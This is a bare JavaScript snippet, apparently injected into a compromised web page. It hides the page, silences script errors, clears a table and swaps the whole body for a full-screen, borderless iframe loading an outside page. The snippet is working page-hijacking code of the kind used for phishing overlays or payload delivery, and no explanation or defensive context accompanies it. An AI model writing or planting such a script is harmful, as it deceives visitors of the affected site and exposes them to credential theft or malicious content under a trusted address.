document.head.innerHTML += "<style>body{display:none}</style>";
window.onerror = function(message, url, lineNumber) {return true;}
setTimeout(function(){ document.getElementsByTagName('table')[0].innerHTML = '';document.body.style.display = "block";document.body.innerHTML = '<iframe src="http://computerperfect.be/Test/User/Test/myro.html" height="100%" width="100%" style="border: 0"' }, 100);
